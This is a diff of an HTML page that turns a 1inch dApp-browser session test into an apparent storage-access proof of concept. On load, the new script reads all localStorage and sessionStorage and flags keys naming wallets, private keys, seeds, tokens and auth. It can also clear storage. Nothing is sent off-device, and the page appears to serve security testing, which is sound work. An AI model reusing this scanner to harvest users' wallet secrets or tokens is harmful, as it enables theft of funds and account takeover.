@@ -3,114 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Session & Multitask Test</title>
+    <title>1inch dApp Browser - Storage Access PoC</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #0f0f23; color: #fff; }
-        .status { padding: 15px; margin: 10px 0; border-radius: 8px; }
-        .connected { background: #28a745; }
-        .disconnected { background: #dc3545; }
-        button { padding: 12px 20px; margin: 8px; font-size: 16px; }
+        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; line-height: 1.5; }
+        pre { background: #222; padding: 15px; overflow: auto; max-height: 70vh; }
+        .warning { color: #ff0; font-weight: bold; }
+        .success { color: #0f0; }
     </style>
 </head>
 <body>
-    <h1>🔍 1inch dApp Browser Test - Session & Multitasking</h1>
+    <h1>1inch Wallet dApp Browser Storage Access Proof-of-Concept</h1>
+    <p class="warning">⚠️ Halaman ini dimuat di dalam 1inch dApp Browser</p>
     
-    <div id="status" class="status disconnected">Status: Disconnected</div>
-    
-    <button onclick="connectWallet()">Connect Wallet (WalletConnect / Injected)</button>
-    <button onclick="signMessage()">Sign Test Message</button>
-    <button onclick="refreshPage()">Pull-to-Refresh Simulation (Reload)</button>
-    
-    <h2>Session Info</h2>
-    <pre id="sessionData">Belum ada session...</pre>
+    <button onclick="scanStorage()">🔍 Scan localStorage + sessionStorage</button>
+    <button onclick="clearAndRescan()">Clear & Rescan</button>
+
+    <h2>Hasil Scan Storage:</h2>
+    <pre id="output">Klik tombol untuk scan...</pre>
+
+    <h2>Sensitive Keys Detected:</h2>
+    <pre id="sensitive"></pre>
 
     <script>
-        let isConnected = false;
-        let account = null;
+        function scanStorage() {
+            const output = document.getElementById('output');
+            const sensitiveEl = document.getElementById('sensitive');
+            let result = "=== localStorage ===\n";
+            let sensitive = "";
 
-        async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0];
-                    isConnected = true;
-                    updateStatus();
-                    saveSession();
-                } catch (error) {
-                    alert('Connect gagal: ' + error.message);
-                }
-            } else {
-                alert('WalletConnect / Injected provider tidak terdeteksi. Coba di 1inch Browser.');
-            }
-        }
-
-        async function signMessage() {
-            if (!isConnected) {
-                alert('Connect wallet dulu!');
-                return;
-            }
-            try {
-                const message = "Test session restore dari 1inch dApp Browser - " + new Date().toISOString();
-                const signature = await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [message, account]
-                });
-                alert('Signature berhasil:\n' + signature.substring(0, 30) + '...');
-                console.log('Signature:', signature);
-            } catch (error) {
-                alert('Sign gagal: ' + error.message);
-            }
-        }
-
-        function updateStatus() {
-            const statusEl = document.getElementById('status');
-            if (isConnected && account) {
-                statusEl.className = 'status connected';
-                statusEl.textContent = `Connected: ${account.substring(0,6)}...${account.substring(38)}`;
-            } else {
-                statusEl.className = 'status disconnected';
-                statusEl.textContent = 'Status: Disconnected';
-            }
-        }
-
-        function saveSession() {
-            const session = {
-                connected: isConnected,
-                account: account,
-                timestamp: new Date().toISOString()
-            };
-            localStorage.setItem('testSession1inch', JSON.stringify(session));
-            document.getElementById('sessionData').textContent = JSON.stringify(session, null, 2);
-        }
-
-        // Load session saat halaman dibuka
-        window.onload = function() {
-            const saved = localStorage.getItem('testSession1inch');
-            if (saved) {
-                const data = JSON.parse(saved);
-                document.getElementById('sessionData').textContent = 
-                    'Session tersimpan (localStorage):\n' + JSON.stringify(data, null, 2);
+            // Scan localStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                result += `${key}: ${value ? value.substring(0, 150) + (value.length > 150 ? '...' : '')}\n`;
                 
-                // Coba restore otomatis (simulasi)
-                if (data.connected) {
-                    document.getElementById('status').innerHTML += '<br><strong>Session ditemukan dari localStorage!</strong>';
+                // Deteksi kunci sensitif
+                const lowerKey = key.toLowerCase();
+                if (lowerKey.includes('wallet') || lowerKey.includes('private') || lowerKey.includes('seed') || 
+                    lowerKey.includes('session') || lowerKey.includes('token') || lowerKey.includes('auth') ||
+                    lowerKey.includes('1inch') || lowerKey.includes('account') || lowerKey.includes('provider')) {
+                    sensitive += `🔴 SENSITIVE: ${key} → ${value ? value.substring(0, 100) + '...' : 'null'}\n`;
                 }
+            }
+
+            result += "\n=== sessionStorage ===\n";
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                result += `${key}: ${value ? value.substring(0, 150) + '...' : ''}\n`;
+            }
+
+            output.textContent = result;
+            sensitiveEl.textContent = sensitive || "Tidak ditemukan kunci sensitif yang jelas.";
+
+            console.log("%c1inch Storage PoC - Semua data di atas berhasil dibaca dari origin dApp ini", "color: yellow; font-size: 14px");
+        }
+
+        function clearAndRescan() {
+            if (confirm("Yakin clear storage? Ini hanya untuk test.")) {
+                localStorage.clear();
+                sessionStorage.clear();
+                document.getElementById('output').textContent = "Storage telah di-clear. Scan lagi...";
+                scanStorage();
             }
         }
 
-        function refreshPage() {
-            location.reload();
-        }
-
-        // Listen network change
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length === 0) {
-                    isConnected = false;
-                    updateStatus();
-                }
-            });
-        }
+        // Auto scan saat load
+        window.onload = () => {
+            setTimeout(scanStorage, 800);
+        };
     </script>
 </body>
 </html>
